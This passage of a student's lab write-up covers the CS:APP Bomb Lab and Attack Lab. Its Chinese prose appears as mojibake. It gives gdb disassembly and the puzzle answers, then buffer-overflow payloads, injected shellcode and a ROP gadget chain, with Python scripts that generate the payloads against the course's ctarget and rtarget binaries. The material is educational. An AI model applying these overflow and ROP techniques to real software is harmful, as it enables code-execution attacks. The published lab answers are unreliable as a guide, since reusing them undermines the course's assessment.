      0x00000000004010b3 <+81>:    mov    $0x40245e,%esi
      0x00000000004010b8 <+86>:    lea    0x10(%rsp),%rdi
      0x00000000004010bd <+91>:    callq  0x401338 <strings_not_equal>
      0x00000000004010c2 <+96>:    test   %eax,%eax
      0x00000000004010c4 <+98>:    je     0x4010d9 <phase_5+119>
      0x00000000004010c6 <+100>:   callq  0x40143a <explode_bomb>
      0x00000000004010cb <+105>:   nopl   0x0(%rax,%rax,1)
      0x00000000004010d0 <+110>:   jmp    0x4010d9 <phase_5+119>
      0x00000000004010d2 <+112>:   mov    $0x0,%eax
      0x00000000004010d7 <+117>:   jmp    0x40108b <phase_5+41>
      0x00000000004010d9 <+119>:   mov    0x18(%rsp),%rax
      0x00000000004010de <+124>:   xor    %fs:0x28,%rax
      0x00000000004010e7 <+133>:   je     0x4010ee <phase_5+140>
      0x00000000004010e9 <+135>:   callq  0x400b30 <__stack_chk_fail@plt>
      0x00000000004010ee <+140>:   add    $0x20,%rsp
      0x00000000004010f2 <+144>:   pop    %rbx
      0x00000000004010f3 <+145>:   retq
   End of assembler dump.
   ```

   å…³é”®ç‚¹åœ¨ä¸ `0x4024b0` å¤„çš„æ•°ç»„è¿›è¡Œå¯¹æ¯”ï¼ŒæŸ¥çœ‹å…¶æ•°æ®ï¼š

   ```
   (gdb) x/s 0x4024b0
   0x4024b0 <array.3449>:  "maduiersnfotvbylSo you think you can stop the bomb with ctrl-c"
   ```

   > è¿™é‡Œ char åº”è¯¥æ˜¯ä½¿ç”¨æ•°ç»„å®šä¹‰çš„ï¼Œä¸æ˜¯ä½¿ç”¨å­—ç¬¦ä¸²å®šä¹‰åˆå§‹åŒ–çš„ï¼Œæ‰€æœ‰å°¾éƒ¨æ²¡æœ‰ `\0` å­—ç¬¦ã€‚

   `0x40245e` å¤„çš„å­—ç¬¦ä¸²ä¸ºï¼š

   ```sh
   (gdb) x/s 0x40245e
   0x40245e:       "flyers"
   ```

   æ‰€ä»¥è¿™ä¸ªé¢˜çš„æ€è·¯å°±æ˜¯å°†å­—ç¬¦ä¸²è¾“å…¥çš„æ¯ä¸ªå­—ç¬¦å’Œ 0xf ä½œä¸è¿ç®—å¾—åˆ°çš„`maduiersnfotvbyl` char æ•°ç»„çš„ç´¢å¼•ï¼Œæ‹¼æ¥æˆ flyersã€‚

   å› æ­¤ç­”æ¡ˆä¸ºï¼š`IONEFG` (éå”¯ä¸€)

6. phase_6

   æŸ¥çœ‹ `phase_6` ä»£ç ï¼š

   ```assembly
   (gdb) disassemble phase_6
   Dump of assembler code for function phase_6:
      0x00000000004010f4 <+0>:     push   %r14
      0x00000000004010f6 <+2>:     push   %r13
      0x00000000004010f8 <+4>:     push   %r12
      0x00000000004010fa <+6>:     push   %rbp
      0x00000000004010fb <+7>:     push   %rbx
      // 50 å­—èŠ‚çš„æ ˆ
      0x00000000004010fc <+8>:     sub    $0x50,%rsp
      0x0000000000401100 <+12>:    mov    %rsp,%r13
      0x0000000000401103 <+15>:    mov    %rsp,%rsi
      0x0000000000401106 <+18>:    callq  0x40145c <read_six_numbers>
      0x000000000040110b <+23>:    mov    %rsp,%r14
      0x000000000040110e <+26>:    mov    $0x0,%r12d
      // ==== å¾ªç¯ a start ====
      0x0000000000401114 <+32>:    mov    %r13,%rbp
      0x0000000000401117 <+35>:    mov    0x0(%r13),%eax
      // æ•°å­—å¿…é¡»å°äºç­‰äº 6 ä¸”å„ä¸ç›¸åŒ
      0x000000000040111b <+39>:    sub    $0x1,%eax
      0x000000000040111e <+42>:    cmp    $0x5,%eax
      0x0000000000401121 <+45>:    jbe    0x401128 <phase_6+52>
      0x0000000000401123 <+47>:    callq  0x40143a <explode_bomb>
      0x0000000000401128 <+52>:    add    $0x1,%r12d
      // æ˜¯å¦éå†å®Œæ¯• 6 ä¸ªæ•°å­—
      0x000000000040112c <+56>:    cmp    $0x6,%r12d
      0x0000000000401130 <+60>:    je     0x401153 <phase_6+95>
      // r12d ä¸ºç´¢å¼•
      0x0000000000401132 <+62>:    mov    %r12d,%ebx
      // ==== å¾ªç¯ b start ====
      0x0000000000401135 <+65>:    movslq %ebx,%rax
      // int[rax]
      0x0000000000401138 <+68>:    mov    (%rsp,%rax,4),%eax
      // ä¸èƒ½ä¸ç¬¬ä¸€ä¸ªå…ƒç´ ç›¸åŒ
      0x000000000040113b <+71>:    cmp    %eax,0x0(%rbp)
      0x000000000040113e <+74>:    jne    0x401145 <phase_6+81>
      0x0000000000401140 <+76>:    callq  0x40143a <explode_bomb>
      0x0000000000401145 <+81>:    add    $0x1,%ebx
      0x0000000000401148 <+84>:    cmp    $0x5,%ebx
      0x000000000040114b <+87>:    jle    0x401135 <phase_6+65>   
      0x000000000040114d <+89>:    add    $0x4,%r13
      0x0000000000401151 <+93>:    jmp    0x401114 <phase_6+32>
      // ==== å¾ªç¯ a/b end ====
      0x0000000000401153 <+95>:    lea    0x18(%rsp),%rsi
      0x0000000000401158 <+100>:   mov    %r14,%rax
      // ä½¿ç”¨ 7 - æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ 
      0x000000000040115b <+103>:   mov    $0x7,%ecx
      0x0000000000401160 <+108>:   mov    %ecx,%edx
      0x0000000000401162 <+110>:   sub    (%rax),%edx
      0x0000000000401164 <+112>:   mov    %edx,(%rax)
      0x0000000000401166 <+114>:   add    $0x4,%rax
      0x000000000040116a <+118>:   cmp    %rsi,%rax
      0x000000000040116d <+121>:   jne    0x401160 <phase_6+108>
      
      0x000000000040116f <+123>:   mov    $0x0,%esi
      0x0000000000401174 <+128>:   jmp    0x401197 <phase_6+163>
      // æ•°ç»„å…ƒç´  > 1
      0x0000000000401176 <+130>:   mov    0x8(%rdx),%rdx
      0x000000000040117a <+134>:   add    $0x1,%eax
      0x000000000040117d <+137>:   cmp    %ecx,%eax
      0x000000000040117f <+139>:   jne    0x401176 <phase_6+130>
      0x0000000000401181 <+141>:   jmp    0x401188 <phase_6+148>
      // æ•°ç»„å…ƒç´  <= 1
      0x0000000000401183 <+143>:   mov    $0x6032d0,%edx
      // long[rsi] = 0x6032d0 5
      0x0000000000401188 <+148>:   mov    %rdx,0x20(%rsp,%rsi,2)
      0x000000000040118d <+153>:   add    $0x4,%rsi
      0x0000000000401191 <+157>:   cmp    $0x18,%rsi
      0x0000000000401195 <+161>:   je     0x4011ab <phase_6+183>
      // ecx æ•°ç»„çš„å…ƒç´  int[rsi]
      0x0000000000401197 <+163>:   mov    (%rsp,%rsi,1),%ecx
      0x000000000040119a <+166>:   cmp    $0x1,%ecx
      0x000000000040119d <+169>:   jle    0x401183 <phase_6+143>
      0x000000000040119f <+171>:   mov    $0x1,%eax
      0x00000000004011a4 <+176>:   mov    $0x6032d0,%edx
      0x00000000004011a9 <+181>:   jmp    0x401176 <phase_6+130>
      // å¯¹ long æ•°ç»„è¿›è¡Œæ“ä½œï¼Œlongæ•°ç»„ä¸­ä¿å­˜çš„æ˜¯åœ°å€ï¼ˆç±»å‹æ˜¯longï¼‰
      0x00000000004011ab <+183>:   mov    0x20(%rsp),%rbx
      0x00000000004011b0 <+188>:   lea    0x28(%rsp),%rax
      0x00000000004011b5 <+193>:   lea    0x50(%rsp),%rsi
      0x00000000004011ba <+198>:   mov    %rbx,%rcx
      // === å¾ªç¯ C start === rcx = long[i], rax = &long[i + 1]
      // *(long[0]+8) = long[i+1]
      0x00000000004011bd <+201>:   mov    (%rax),%rdx
      0x00000000004011c0 <+204>:   mov    %rdx,0x8(%rcx)
      0x00000000004011c4 <+208>:   add    $0x8,%rax
      0x00000000004011c8 <+212>:   cmp    %rsi,%rax
      0x00000000004011cb <+215>:   je     0x4011d2 <phase_6+222>
      // =long[i+1]
      0x00000000004011cd <+217>:   mov    %rdx,%rcx
      0x00000000004011d0 <+220>:   jmp    0x4011bd <phase_6+201>
      // ==== å¾ªç¯ C end ===
      0x00000000004011d2 <+222>:   movq   $0x0,0x8(%rdx)
      0x00000000004011da <+230>:   mov    $0x5,%ebp
      0x00000000004011df <+235>:   mov    0x8(%rbx),%rax
      0x00000000004011e3 <+239>:   mov    (%rax),%eax
      0x00000000004011e5 <+241>:   cmp    %eax,(%rbx)
      0x00000000004011e7 <+243>:   jge    0x4011ee <phase_6+250>
      0x00000000004011e9 <+245>:   callq  0x40143a <explode_bomb>
      0x00000000004011ee <+250>:   mov    0x8(%rbx),%rbx
      0x00000000004011f2 <+254>:   sub    $0x1,%ebp
      0x00000000004011f5 <+257>:   jne    0x4011df <phase_6+235>
      0x00000000004011f7 <+259>:   add    $0x50,%rsp
      0x00000000004011fb <+263>:   pop    %rbx
      0x00000000004011fc <+264>:   pop    %rbp
      0x00000000004011fd <+265>:   pop    %r12
      0x00000000004011ff <+267>:   pop    %r13
      0x0000000000401201 <+269>:   pop    %r14
      0x0000000000401203 <+271>:   retq
   End of assembler dump.
   ```

   å¯¹åº”çš„ C è¯­è¨€å½¢å¼ï¼š

   ```c
   void p6(int num[]) {
       // i = r12d
       for(int i = 0; i < 6; i ++) {
           if(num[i] > 6)bomb();
           
           for(int j = i + 1; j <= 5; j ++) {
               if(num[j]==num[i])bomb();
           }
       }
       
   	for(int i = 0; i < 6; i ++) {
           num[i] = 7 - num[i];
       }
       
       // i -- rsi -- 163
       // è¿‡ç¨‹2
       long ll[6];	// ll - rbx
       for(int i = 0; i < 6; i ++) {
           int rdx = 0x6032d0;
           if(num[i] > 1) {
               int j = 1;	// j -- eax
               do {
                   rdx = rdx + 0x10;	// å¤„ç†è¿‡
                   j++;
               }while(j != num[i]);
           } 
           ll[i++] = rdx;
       }
       // è¿‡ç¨‹3
       int rbx = ll[0], rcx = rbx;
       for(int i = 1; i < 5; i++) {
           // 201
           *(rcx + 8) = ll[i];
           rcx = ll[i];
       }
       
       long rbx = (long)(&ll[0]);
       
       for(int i = 1; i < 5; i++) {
           int rax = *(int*)(rbx+8);
           int eax = *(int *)(long*)(rax)
           if(*(rbx) >= eax) {
               rbx = *(long*)(rbx+8);
           } else bomb();
       }
       
   }
   ```

   é‡è¦æ•°ç»„ä¿¡æ¯ï¼š

   ```
   (gdb) x/16xg 0x6032d0
   0x6032d0 <node1>:       0x000000010000014c      0x00000000006032e0
   0x6032e0 <node2>:       0x00000002000000a8      0x00000000006032f0
   0x6032f0 <node3>:       0x000000030000039c      0x0000000000603300
   0x603300 <node4>:       0x00000004000002b3      0x0000000000603310
   0x603310 <node5>:       0x00000005000001dd      0x0000000000603320
   0x603320 <node6>:       0x00000006000001bb      0x0000000000000000
   ```

   å¤§è‡´æ„æ€å°±æ˜¯ï¼š

   7 - nums[i] åçš„æ•°ç»„å‡å¦‚ä¸º 1 2 3 4 5 6 åˆ†åˆ«å¯¹åº”æ•°ç»„ [0x6032d0, 0x6032e0, 0x6032f0, 0x603300, 0x603310, 0x603320] çš„ç´¢å¼•ï¼ˆä»1å¼€å§‹è®¡ç®—ï¼‰ï¼Œè¿™äº›åœ°å€åˆ†åˆ«å¯¹åº”çš„å€¼ä¸º [0x14c, 0xa8, 0x39c, 0x2b3, 0x1dd, 0x1bb]ï¼Œç”±äºæœ€åéœ€è¦è¦æ±‚å¯¹æ•°å€¼è¿›è¡Œé™åºæ’åˆ—ï¼Œå¯¹åº”çš„ ll æ•°ç»„å€¼ä¸º [0x6032f0, 0x603300, 0x603310, 0x603320, 0x6032d0, 0x6032e0] å…¶å¯¹åº”çš„ç´¢å¼•ä¸º [3 4 5 6 1 2]ï¼Œå› æ­¤ç­”æ¡ˆä¸º [4 3 2 1 6 5]


### 3. Attack Lab

ğŸ”µPreï¼š

* å¦‚ä½•å°†ç‰¹å®šæ±‡ç¼–ä»£ç è½¬ä¸ºäºŒè¿›åˆ¶ï¼š

  æ¯”å¦‚å‘ `bang.s` ä¸­å†™å…¥ä¸€æ®µæ±‡ç¼–ä»£ç ï¼š

  ```assembly
  mov $0xa, %eax
  ret
  ```

  ä½¿ç”¨ gcc å¯¹å…¶è¿›è¡Œç¼–è¯‘ï¼š

  ```sh
  gcc -c bang.s
  ```

  ç¼–è¯‘åå¾—åˆ° `bang.o` çš„æ–‡ä»¶ï¼Œä½¿ç”¨ `objdump` è¿›è¡Œåæ±‡ç¼–ï¼š

  ```sh
  $ objdump -d bang.o
  bang.o:     file format elf64-x86-64
  Disassembly of section .text:
  
  0000000000000000 <.text>:
     0:   b8 0a 00 00 00          mov    $0xa,%eax
     5:   c3                  retq
  ```

  å³å¯å¾—åˆ°å¯¹åº”çš„ bytecodeã€‚

* ç”±äºæ˜¯ç¦»çº¿å®éªŒï¼Œå› æ­¤è¿è¡Œæ—¶å€™éœ€è¦æ·»åŠ  `-q` å‚æ•°

  ```sh
  ./ctarget -q
  ./rtarget -q
  ```

  åœ¨ GDB ä¸­è°ƒè¯•éœ€è¦è®¾ç½®ï¼š

  ```sh
  (gdb) set args -q
  (gdb) set disassemble-next-line on
  ```

* ç”±äºè¾“å…¥çš„å­—ç¬¦éƒ½æ˜¯ ASCII ç ï¼Œå…¶ä¸­æœ‰äº›å­—ç¬¦ä¸èƒ½ç”¨é”®ç›˜è¡¨ç¤ºå‡ºæ¥ï¼Œå› æ­¤éœ€è¦å€ŸåŠ©å·¥å…· `hex2raw` è¿›è¡Œå®ç°ï¼š

  ```sh
  ./hex2raw < touch1.txt | ./ctarget -q
  ```

  æˆ–è€…ä½¿ç”¨ python è¾“å‡ºäºŒè¿›åˆ¶æ–‡ä»¶åè¿›è¡Œè§£ç­”ï¼š

  ```sh
  ./ctarget -q -i touch1.txt
  ```

* å­¦ä¼šä½¿ç”¨ python ç­‰å·¥å…·è¾“å‡ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼š

  ```py
  import struct
  
  payloads = [0xaa]
  with open('touch1.txt', 'wb') as f:
      for x in payloads:
          f.write(struct.pack('B', x))
  
  print('Done')
  ```

  

ğŸ”µPhase 1

æ ¹æ®[ä½œä¸šæç¤º](http://csapp.cs.cmu.edu/3e/attacklab.pdf)ä¸­çš„ä¿¡æ¯å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªé˜¶æ®µåªéœ€è¦è¿›è¡Œç¼“å†²åŒºæº¢å‡ºè¦†å†™ä¸Šä¸€ä¸ªå‡½æ•°çš„åœ°å€ã€‚

ç”±äºéœ€è¦è°ƒç”¨ `touch1()` å‡½æ•°ï¼ŒæŸ¥çœ‹ touch1 å‡½æ•°ï¼š

```assembly
(gdb) disassemble touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
End of assembler dump.
```

å¯ä»¥çŸ¥é“ touch1 çš„å…¥å£åœ°å€ä¸ºï¼š0x4017c0

ç”±äºéœ€è¦ä» `getbuf` å‡½æ•°ä¸­ ret åˆ° touch1 å‡½æ•°ï¼Œå› æ­¤æŸ¥çœ‹å‡½æ•°ï¼š

```assembly
(gdb) disassemble getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
End of assembler dump.
```

ç”±æ­¤å¯ä»¥çŸ¥é“ getbuf åˆ†é…äº† 40 å­—èŠ‚ (0x28) çš„ç¼“å†²åŒºï¼Œåˆ™ payload æ˜¯åœ¨åé¢ 40 å­—èŠ‚ä¹‹åã€‚

è¿è¡Œç¨‹åºåœ¨ 0x04017b4 å¤„æ‰“æ–­ç‚¹ï¼Œè¾“å…¥`aaaaa` æµ‹è¯•æŸ¥çœ‹æ ˆæƒ…å†µã€‚

![image-20220907162947038](csapp.assets/image-20220907162947038.png)

![image-20220907163008278](csapp.assets/image-20220907163008278.png)

å¯ä»¥çœ‹åˆ°æ­£å¸¸æµç¨‹ç»è¿‡ ret ä¼šè¿”å›åˆ° 0x401976 åœ°å€å¤„ï¼Œè¦æƒ³è°ƒç”¨ touch1 å‡½æ•°ï¼Œç»è¿‡ç¼“å†²åŒºæº¢å‡ºåéœ€è¦å°†æ ˆä¸­å¯¹åº”çš„åœ°å€æ”¹æˆ touch1 çš„å…¥å£åœ°å€  0x4017c0ï¼Œå› æ­¤å¾—åˆ° payloadï¼š

```
0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0x01 0xc0 0x17 0x40
```

å…¶ä¸­å‰ 40 å­—èŠ‚æ•°æ®ä¸è¿›è¡Œé™åˆ¶ï¼Œæœ€åä¸‰ä¸ªå­—èŠ‚å¿…é¡»æ˜¯ `c0 17 40` ï¼ˆå°ç«¯åºå­˜å‚¨ï¼‰ã€‚

å¯ä»¥ä½¿ç”¨è„šæœ¬ç”Ÿæˆå¯¹åº”çš„ payload è¿›è¡Œè¾“å…¥ï¼š

```py
#!python
import struct

payloads = [0x61] * 40;
payloads = payloads + [0xc0, 0x17, 0x40, 0x00]
with open('touch1.txt', 'wb') as f:
    for x in payloads:
        f.write(struct.pack('B', x))

print('Done')
```

æœ€ç»ˆå°†ç”Ÿæˆçš„ touch1.txt è¾“å…¥ï¼š

```sh
$ ./ctarget -q -i touch1.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 C0 17 40 00
```

æˆåŠŸ Pass.

ğŸ”µ Phase 2

é¦–å…ˆæŸ¥çœ‹ touch2 å‡½æ•°å…¥å£åœ°å€ï¼š

```assembly
(gdb) disassemble touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:    jne    0x401824 <touch2+56>
   # ....
End of assembler dump.
```

æ ¹æ® Phase 1 é˜¶æ®µé¦–å…ˆå†™ payload è·³è½¬åˆ° touch2 å‡½æ•°å…¥å£ï¼Œç”±äºéœ€è¦å¯¹æ¯” cookie çš„å€¼ 0x59b997faï¼ˆå³Cookie.txt ä¸­çš„æ•°å­—ï¼‰ï¼Œå› æ­¤éœ€è¦ä¼ å…¥çš„å‚æ•°ä¸ cookie ç›¸åŒï¼Œå³éœ€è¦æ”¹å˜ edi å¯„å­˜å™¨ä¸­çš„å€¼ã€‚

æ€è·¯ï¼š

1. ç”±äºæœªå¼€å¯æ ˆéšæœºåŒ–å’Œæœªç¦æ­¢æ ˆä»£ç å¯æ‰§è¡Œï¼Œå› æ­¤é¦–å…ˆ ret åˆ°ç¼“å­˜åŒºå¼€å¤´ 0x5561dc78

2. ç¼–å†™ç¼“å†²åŒºçš„ä»£ç ä¸ºï¼š

   ```assembly
   mov $0x59b997fa, %edi
   ret
   ```

3. ä½¿ç”¨ gcc å’Œ objdump ç”Ÿæˆå¯¹åº”çš„å­—èŠ‚ç 

   ```sh
   $ objdump -d bang.o
   
   bang.o:     file format elf64-x86-64
   Disassembly of section .text:
   
   0000000000000000 <.text>:
      0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
      5:   c3                  retq
   ```

4. ç”±äºç¼“å†²åŒºä»£ç åˆä¸€ä¸ª retï¼Œå› æ­¤ä¸‹ä¸€è·³å°±åº”è¯¥æ˜¯ touch2 å‡½æ•°çš„å…¥å£ï¼Œå› æ­¤åœ¨æ ˆåœ°å€ä¹‹åæ·»åŠ  touch2 çš„åœ°å€ 0x4017ec

5. å¯¹åº”çš„ payload ä¸ºï¼š

   ```
   BF FA 97 B9 59 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00
   ```

   è„šæœ¬ä¸ºï¼š

   ```py
   import struct
   
   payloads = [0xbf, 0xfa, 0x97, 0xb9, 0x59, 0xc3]
   payloads = payloads + [0x61] * 34;
   payloads = payloads + [0x78, 0xdc, 0x61, 0x55, 0x00, 0x00, 0x00, 0x00, 0xec, 0x17, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]
   with open('touch2.txt', 'wb') as f:
       for x in payloads:
           f.write(struct.pack('B', x))
   
   print('Done')
   ```

   å…¶ä¸­ç”±äºåœ°å€ä¸º 8 å­—èŠ‚ï¼Œå› æ­¤éœ€è¦åœ¨ä¹‹åè¿›è¡Œè¡¥ 0 æ“ä½œã€‚

6. æœ€ç»ˆ pass

   ```sh
   $ ./ctarget -q -i touch2.txt
   Cookie: 0x59b997fa
   Touch2!: You called touch2(0x59b997fa)
   Valid solution for level 2 with target ctarget
   PASS: Would have posted the following:
           user id bovik
           course  15213-f15
           lab     attacklab
           result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00
   ```

ğŸ”µPhase 3

é¦–å…ˆæŸ¥çœ‹ `touch3` å‡½æ•°çš„å…¥å£åœ°å€ä¸º 0x4018faï¼š

```assembly
(gdb) disassemble touch3
Dump of assembler code for function touch3:
	0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:    callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   %eax,%eax
   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
   # ....
End of assembler dump.
```

æ„Ÿè§‰æ€è·¯å¤§è‡´å’Œ phase 2ä¸€è‡´ï¼Œç”±äºéœ€è¦ cookie çš„ ascii è¡¨ç¤ºå½¢å¼ï¼Œæ‰€ä»¥ä¿è¯è¾“å…¥åˆ° touch3 å‡½æ•°ä¸­çš„å­—ç¬¦ä¸²å‰ 8 ä½ä¸º 59b997faã€‚

æ€è·¯ï¼š

1. ç”±äºæœªå¼€å¯æ ˆéšæœºåŒ–å’Œæœªç¦æ­¢æ ˆä»£ç å¯æ‰§è¡Œï¼Œå› æ­¤é¦–å…ˆ ret åˆ°ç¼“å­˜åŒºå¼€å¤´ 0x5561dc78

2. ç”±äºæ­¤æ¬¡ touch3 ä¿å­˜æ•°æ®ç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼š

   å­—ç¬¦ä¸² "59b997fa" å¯¹åº”çš„äºŒè¿›åˆ¶å½¢å¼ä¸ºï¼š

   ```
   0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61
   ```

3. åˆ†æ touch3 å‡½æ•°ï¼Œtouch3 çš„ sval å‚æ•° char* ç±»å‹çš„æŒ‡é’ˆå­˜æ”¾åœ¨ rdi ä¸­ï¼Œå› æ­¤åœ¨æ­¤ä¹‹å‰åº”è¯¥å°†å­—ç¬¦ä¸² "59b997fa" çš„åœ°å€å­˜æ”¾åœ¨ rdi ä¸­ã€‚

4. é¦–å…ˆé€‰æ‹©å­—ç¬¦ä¸² "59b997fa" å­˜æ”¾çš„ä½ç½®ï¼Œå°±é€‰æ‹©å­˜æ”¾åœ¨å…¶ä»–ä½ç½®ï¼Œæˆ‘è¿™é‡Œé€‰æ‹© 0x604800 å¤„ï¼š

   ```assembly
   mov $0x604800, %rdi
   movl $0x39623935, (%rdi)
   movl $0x61663739, 4(%rdi)
   retq
   ```

5. ä½¿ç”¨ gcc å’Œ objdump ç”Ÿæˆå¯¹åº”çš„å­—èŠ‚ç 

   ```sh
   (rs) yl@amax:~/repo/33/11/csapp/code/chapt3/target1$ objdump -d bang.o
   bang.o:     file format elf64-x86-64
   Disassembly of section .text:
   
   0000000000000000 <.text>:
      0:   48 c7 c7 00 48 60 00    mov    $0x604800,%rdi
      7:   c7 07 35 39 62 39       movl   $0x39623935,(%rdi)
      d:   c7 47 04 39 37 66 61    movl   $0x61663739,0x4(%rdi)
     14:   c3                      retq
   ```

6. å¯¹åº” payload ä¸ºï¼š

   ```
   48 C7 C7 00 48 60 00 C7 07 35 39 62 39 C7 47 04 39 37 66 61 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00
   ```

   è„šæœ¬ä¸ºï¼š

   ```py
   #!python
   import struct
   
   #payloads = [0x48, 0xbf, 0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61, 0xc3]
   payloads =[0x48, 0xc7, 0xc7, 0x00, 0x48, 0x60, 0x00, 0xc7, 0x07, 0x35, 0x39, 0x62, 0x39, 0xc7, 0x47, 0x04, 0x39, 0x37, 0x66, 0x61, 0xc3]
   payloads = payloads + [0x61] * (40-len(payloads));
   payloads = payloads + [0x78, 0xdc, 0x61, 0x55, 0x00, 0x00, 0x00, 0x00, 0xfa, 0x18, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]
   with open('touch3.txt', 'wb') as f:
           for x in payloads:
                   f.write(struct.pack('B', x))
   
   print('Done')
   ```

7. æœ€ç»ˆ pass

   ```sh
   $ ./ctarget -q -i touch3.txt
   Cookie: 0x59b997fa
   Touch3!: You called touch3("59b997fa")
   Valid solution for level 3 with target ctarget
   PASS: Would have posted the following:
           user id bovik
           course  15213-f15
           lab     attacklab
           result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 00 48 60 00 C7 07 35 39 62 39 C7 47 04 39 37 66 61 C3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00
   ```


ğŸ”µPhase 4

ç”±äºå¼€å¯äº†æ ˆéšæœºåŒ–ä»¥åŠæ ˆä»£ç ä¸å¯æ‰§è¡Œã€‚

æ€è·¯ï¼šå‘ç¼“å†²åŒºå†™å…¥ cookie æ•°å€¼ï¼Œé€šè¿‡ pop åˆ°å¯¹åº”å¯„å­˜å™¨å®Œæˆèµ‹å€¼

æ­¥éª¤ï¼š

1. é¦–å…ˆæ‰¾åˆ° `popq` çš„æŒ‡ä»¤ç‰‡æ®µï¼Œæœ‰ä¸¤ä¸ªåœ°æ–¹ï¼š

   ![image-20220908122803759](csapp.assets/image-20220908122803759.png)

   éšä¾¿é€‰å–ä¸€å¤„åœ°å€ï¼Œè¿™é‡Œé€‰å– 0x4019abï¼Œç¡®å®šç¬¬ä¸€å¤„è·³è½¬çš„åœ°å€

2. ç”±äº `58` æ˜¯ pop åˆ° rax å¯„å­˜å™¨ä¸­ï¼Œè¿˜éœ€è¦å­˜å‚¨åˆ° rdi å¯„å­˜å™¨ä¸­ï¼Œå› æ­¤è¿˜éœ€è¦ `movq rax, rdi` 

   ![image-20220908123827332](csapp.assets/image-20220908123827332.png)

   å¾—åˆ°ä¸‹ä¸€ä¸ª gadget åœ°å€ 0x4019c5

3. ç”±äº popq æŒ‡ä»¤ä¹Ÿæ˜¯ä»æ ˆä¸­è¿›è¡Œå–æ•°æ®ï¼Œå› æ­¤è¿˜åº”è¯¥å‘ç¼“å†²åŒºè¾“å…¥ cookie çš„å€¼ 0x59b997fa

4. æ‹¼æ¥å¾—åˆ° payloadï¼š

   ```
   61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
   ```

   ç¼–å†™è„šæœ¬ç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼š

   ```py
   import struct
   
   payloads = [0x61] * 40;
   payloads = payloads + [0xab, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xfa, 0x97, 0xb9, 0x59, 0x00, 0x00, 0x00, 0x00, 0xc5, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xec, 0x17, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]
   with open('touch4.txt', 'wb') as f:
       for x in payloads:
           f.write(struct.pack('B', x))
   
   print('Done')
   ```

5. æœ€ç»ˆ pass

   ```sh
   $ ./rtarget -q -i touch4.txt
   Cookie: 0x59b997fa
   Touch2!: You called touch2(0x59b997fa)
   Valid solution for level 2 with target rtarget
   PASS: Would have posted the following:
           user id bovik
           course  15213-f15
           lab     attacklab
